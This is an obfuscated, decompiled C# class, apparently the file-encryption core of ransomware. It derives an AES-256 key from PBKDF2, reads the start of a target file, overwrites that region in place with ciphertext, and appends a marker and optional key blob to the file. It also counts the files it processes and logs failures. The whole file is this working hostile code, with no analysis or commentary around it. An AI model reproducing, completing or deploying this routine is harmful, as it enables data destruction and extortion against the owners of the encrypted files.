using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace oXSOOyVgTNm;

public static class xDMypKOxUD
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] EmzieFXgUGooI(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = kCvqtQNvsmvGJF(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes kCvqtQNvsmvGJF(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] DGMRcCHBjFbxJ(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (NuHMiFuRoVNiZNRl.znQoURUZOUr == getString_0(107397323))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (NuHMiFuRoVNiZNRl.sfIQAmNvQu)
			{
				try
				{
					File.AppendAllText(NuHMiFuRoVNiZNRl.DFeZKWhzZEN, getString_0(107385491) + string_0 + getString_0(107399831) + ex.Message + getString_0(107396701));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void PerouGeIvmxU(string SDWAgRRAQsnxQ, byte[] AZdtlXlIbCEFkk, byte[] BbOGTxvaLAuDcV = null)
	{
		try
		{
			byte[] array = null;
			if (NuHMiFuRoVNiZNRl.znQoURUZOUr == getString_0(107397323))
			{
				array = (NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk ? Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(NuHMiFuRoVNiZNRl.arrfJwYoVN) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399773)) + Convert.ToString(NuHMiFuRoVNiZNRl.mztBYJzvvrZxTt) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399773))) : Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(NuHMiFuRoVNiZNRl.arrfJwYoVN) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399750)) + Convert.ToString(NuHMiFuRoVNiZNRl.mztBYJzvvrZxTt) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399750))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(SDWAgRRAQsnxQ, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(AZdtlXlIbCEFkk, 0, AZdtlXlIbCEFkk.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(SDWAgRRAQsnxQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(BbOGTxvaLAuDcV, 0, BbOGTxvaLAuDcV.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk ? Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(NuHMiFuRoVNiZNRl.arrfJwYoVN) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399773)) + Convert.ToString(NuHMiFuRoVNiZNRl.mztBYJzvvrZxTt) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399773))) : Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(NuHMiFuRoVNiZNRl.arrfJwYoVN) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399750)) + Convert.ToString(NuHMiFuRoVNiZNRl.mztBYJzvvrZxTt) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399750))));
				FileStream fileStream2 = new FileStream(SDWAgRRAQsnxQ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(AZdtlXlIbCEFkk, 0, AZdtlXlIbCEFkk.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(SDWAgRRAQsnxQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(BbOGTxvaLAuDcV, 0, BbOGTxvaLAuDcV.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			NuHMiFuRoVNiZNRl.cLVmkVhYZQAqR++;
		}
		catch (Exception ex)
		{
			if (NuHMiFuRoVNiZNRl.sfIQAmNvQu)
			{
				try
				{
					File.AppendAllText(NuHMiFuRoVNiZNRl.DFeZKWhzZEN, getString_0(107385491) + SDWAgRRAQsnxQ + getString_0(107399764) + ex.Message + getString_0(107396701));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk ? Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(NuHMiFuRoVNiZNRl.arrfJwYoVN) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399773)) + Convert.ToString(NuHMiFuRoVNiZNRl.mztBYJzvvrZxTt) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399773))) : Encoding.ASCII.GetBytes(NuHMiFuRoVNiZNRl.VrSebPGaWq(NuHMiFuRoVNiZNRl.arrfJwYoVN) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399750)) + Convert.ToString(NuHMiFuRoVNiZNRl.mztBYJzvvrZxTt) + NuHMiFuRoVNiZNRl.VrSebPGaWq(getString_0(107399750))));
			FileStream fileStream4 = new FileStream(SDWAgRRAQsnxQ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(AZdtlXlIbCEFkk, 0, AZdtlXlIbCEFkk.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(SDWAgRRAQsnxQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!NuHMiFuRoVNiZNRl.OGOvpjxWqYzkk)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(BbOGTxvaLAuDcV, 0, BbOGTxvaLAuDcV.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static xDMypKOxUD()
	{
		Strings.CreateGetStringDelegate(typeof(xDMypKOxUD));
	}
}
